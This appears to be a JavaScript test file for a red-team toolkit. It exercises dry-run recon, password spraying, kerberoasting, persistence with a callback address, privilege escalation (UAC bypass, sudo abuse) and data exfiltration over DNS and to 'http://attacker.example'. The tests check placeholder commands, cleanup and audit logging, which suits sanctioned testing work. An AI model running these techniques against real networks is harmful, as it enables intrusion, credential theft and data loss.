/**
 * 红队渗透模块测试（node:test）
 * 覆盖：内网侦察、横向移动、数据窃取、权限提升
 */
import test from 'node:test'
import assert from 'node:assert/strict'
import { InternalRecon } from '../lib/redteam/internal-recon.js'
import { LateralExecutor } from '../lib/redteam/lateral-executor.js'
import { DataExfiltration } from '../lib/redteam/data-exfiltration.js'
import { PrivescEngine } from '../lib/redteam/privesc-engine.js'

/* ───────────────────────── InternalRecon ───────────────────────── */

test('internal-recon: scanLiveHosts dry-run returns hosts', async () => {
  const recon = new InternalRecon({ dryRun: true })
  const result = await recon.scanLiveHosts('192.168.1.0/24')
  assert.equal(result.success, true)
  assert.ok(Array.isArray(result.hosts))
  assert.equal(result.hosts.length, 2)
  assert.ok(result.hosts[0].ip)
  assert.equal(typeof result.hosts[0].latency, 'number')
})

test('internal-recon: scanPorts returns open ports', async () => {
  const recon = new InternalRecon({ dryRun: true })
  const result = await recon.scanPorts('192.168.1.100')
  assert.equal(result.success, true)
  assert.ok(result.ports.length > 0)
  assert.ok(result.ports.some((p) => p.port === 445))
})

test('internal-recon: getServiceFingerprint identifies ssh service', async () => {
  const recon = new InternalRecon({ dryRun: true })
  const result = await recon.getServiceFingerprint('192.168.1.100', 22)
  assert.equal(result.success, true)
  assert.equal(result.service, 'ssh')
  assert.ok(result.version)
  assert.equal(result.os_hint, 'Linux')
})

test('internal-recon: enumerateSMBShares lists shares', async () => {
  const recon = new InternalRecon({ dryRun: true })
  const result = await recon.enumerateSMBShares('192.168.1.100', {
    username: 'admin', password: 'pass',
  })
  assert.equal(result.success, true)
  assert.ok(result.shares.length > 0)
})

test('internal-recon: queryLDAP returns users/computers/groups', async () => {
  const recon = new InternalRecon({ dryRun: true })
  const result = await recon.queryLDAP('192.168.1.10', {
    username: 'admin@example.com', password: 'pass',
  })
  assert.equal(result.success, true)
  assert.ok(result.users.length > 0)
  assert.ok(result.computers.length > 0)
  assert.ok(result.groups.length > 0)
})

/* ───────────────────────── LateralExecutor ───────────────────────── */

test('lateral-executor: executeSSH runs command in dry-run', async () => {
  const lateral = new LateralExecutor({ dryRun: true })
  const result = await lateral.executeSSH('192.168.1.100',
    { username: 'user', password: 'pass' }, 'whoami')
  assert.equal(result.success, true)
  assert.ok(result.stdout)
  assert.equal(result.command, 'whoami')
})

test('lateral-executor: executeWinRM runs PowerShell in dry-run', async () => {
  const lateral = new LateralExecutor({ dryRun: true })
  const result = await lateral.executeWinRM('192.168.1.100',
    { username: 'admin', password: 'pass', domain: 'DOMAIN' }, 'whoami')
  assert.equal(result.success, true)
  assert.ok(result.stdout)
})

test('lateral-executor: passwordSpray returns valid credentials', async () => {
  const lateral = new LateralExecutor({ dryRun: true })
  const result = await lateral.passwordSpray('192.168.1.0/24', 'ssh',
    ['admin', 'user'], ['password', 'admin123'])
  assert.equal(result.success, true)
  assert.ok(Array.isArray(result.valid_creds))
})

test('lateral-executor: kerberoast extracts service tickets', async () => {
  const lateral = new LateralExecutor({ dryRun: true })
  const result = await lateral.kerberoast('192.168.1.10',
    { username: 'user@DOMAIN.COM', password: 'pass' })
  assert.equal(result.success, true)
  assert.ok(result.tickets.length > 0)
  assert.ok(result.tickets[0].service)
})

test('lateral-executor: createPersistence returns cleanup command', async () => {
  const lateral = new LateralExecutor({ dryRun: true })
  const result = await lateral.createPersistence('192.168.1.100',
    { username: 'admin', password: 'pass' }, '192.168.1.50:4444')
  assert.equal(result.success, true)
  assert.ok(result.persistence_method)
  // 可逆性：必须给出清理命令
  assert.ok(result.cleanup_command)
})

test('lateral-executor: gatherDomainInfo returns forest and trusts', async () => {
  const lateral = new LateralExecutor({ dryRun: true })
  const result = await lateral.gatherDomainInfo('192.168.1.10',
    { username: 'user@DOMAIN.COM', password: 'pass' })
  assert.equal(result.success, true)
  assert.ok(result.forest)
  assert.ok(Array.isArray(result.domains))
})

/* ───────────────────────── DataExfiltration ───────────────────────── */

test('data-exfiltration: scanSensitiveFiles finds credential files', async () => {
  const exfil = new DataExfiltration({ dryRun: true })
  const result = await exfil.scanSensitiveFiles('192.168.1.100',
    { username: 'admin', password: 'pass' })
  assert.equal(result.success, true)
  assert.ok(result.files.length > 0)
})

test('data-exfiltration: extractDatabase returns records and byte count', async () => {
  const exfil = new DataExfiltration({ dryRun: true })
  const result = await exfil.extractDatabase('mysql', '192.168.1.100',
    { username: 'root', password: 'pass' }, { database: 'test', table: 'users' })
  assert.equal(result.success, true)
  assert.ok(result.records.length > 0)
  assert.ok(result.bytes_exfiltrated > 0)
})

test('data-exfiltration: harvestCredentials collects multiple types', async () => {
  const exfil = new DataExfiltration({ dryRun: true })
  const result = await exfil.harvestCredentials('192.168.1.100',
    { username: 'user', password: 'pass' }, 'browser')
  assert.equal(result.success, true)
  assert.ok(result.credentials.length > 0)
})

test('data-exfiltration: DNS channel reports chunk count', async () => {
  const exfil = new DataExfiltration({ dryRun: true })
  const result = await exfil.exfiltrateViaDNS('dGVzdGRhdGE=', '8.8.8.8')
  assert.equal(result.success, true)
  assert.ok(result.chunks_sent > 0)
  assert.equal(result.method, 'dns-tunneling')
})

test('data-exfiltration: HTTP channel encrypts by default', async () => {
  const exfil = new DataExfiltration({ dryRun: true })
  const result = await exfil.exfiltrateViaHTTP('sensitivedata', 'http://attacker.example')
  assert.equal(result.success, true)
  assert.ok(result.bytes_sent > 0)
  assert.equal(result.encrypted, true)
})

/* ───────────────────────── PrivescEngine ───────────────────────── */

test('privesc-engine: Windows opportunities include UAC bypass', async () => {
  const privesc = new PrivescEngine({ dryRun: true })
  const result = await privesc.identifyPrivescOpportunities('192.168.1.100',
    { username: 'user', password: 'pass', currentPrivilege: 'user' }, 'windows')
  assert.equal(result.success, true)
  assert.ok(result.opportunities.length > 0)
  assert.ok(result.opportunities.some((o) => o.method === 'uac-bypass'))
})

test('privesc-engine: Linux opportunities include sudo abuse', async () => {
  const privesc = new PrivescEngine({ dryRun: true })
  const result = await privesc.identifyPrivescOpportunities('192.168.1.100',
    { username: 'user', password: 'pass', currentPrivilege: 'user' }, 'linux')
  assert.equal(result.success, true)
  assert.ok(result.opportunities.some((o) => o.method === 'sudo-nopasswd'))
})

test('privesc-engine: executePrivesc elevates to SYSTEM in dry-run', async () => {
  const privesc = new PrivescEngine({ dryRun: true })
  const result = await privesc.executePrivesc('192.168.1.100',
    { username: 'user', password: 'pass', currentPrivilege: 'user' }, 'uac-bypass')
  assert.equal(result.success, true)
  assert.equal(result.newPrivilege, 'SYSTEM')
  assert.ok(result.command)
})

test('privesc-engine: generated commands are placeholders only', () => {
  const privesc = new PrivescEngine()
  const result = privesc.generatePrivescCommand('windows', 'uac-bypass')
  assert.ok(result.command)
  assert.ok(result.description)
  assert.equal(result.risk_level, 'medium')
  // 占位符，不含可执行的真实目标参数
  assert.ok(result.command.includes('PLACEHOLDER'))
})

test('privesc-engine: auditSystemConfiguration returns config list', async () => {
  const privesc = new PrivescEngine({ dryRun: true })
  const result = await privesc.auditSystemConfiguration('192.168.1.100',
    { username: 'admin', password: 'pass' }, 'windows')
  assert.ok(Array.isArray(result.vulnerable_configs))
})

test('privesc-engine: chain execution reports per-step results', async () => {
  const privesc = new PrivescEngine({ dryRun: true })
  const result = await privesc.executePrivescChain([
    { method: 'initial-access', command: 'initial', risk: 'high' },
    { method: 'uac-bypass', command: 'uac', risk: 'medium' },
  ])
  assert.equal(result.success, true)
  assert.equal(result.escalated_to, 'SYSTEM')
  assert.equal(result.chain_steps.length, 2)
})

test('privesc-engine: recordPrivesc fails closed without an audit store', async () => {
  const privesc = new PrivescEngine()
  const result = await privesc.recordPrivesc(null, { method: 'uac-bypass' })
  assert.equal(result.success, false)
  assert.ok(result.error)
})

/* ───────────────────────── 集成 ───────────────────────── */

test('penetration pipeline: recon → lateral → privesc → exfil all dry-run', async () => {
  const recon = new InternalRecon({ dryRun: true })
  const lateral = new LateralExecutor({ dryRun: true })
  const privesc = new PrivescEngine({ dryRun: true })
  const exfil = new DataExfiltration({ dryRun: true })

  const scan = await recon.scanLiveHosts('192.168.1.0/24')
  assert.equal(scan.success, true)

  const spray = await lateral.passwordSpray('192.168.1.100', 'ssh', ['admin'], ['password123'])
  assert.equal(spray.success, true)

  const priv = await privesc.identifyPrivescOpportunities('192.168.1.100',
    { username: 'admin', password: 'pass', currentPrivilege: 'user' }, 'linux')
  assert.equal(priv.success, true)

  const data = await exfil.scanSensitiveFiles('192.168.1.100',
    { username: 'root', password: 'pass' })
  assert.equal(data.success, true)
})
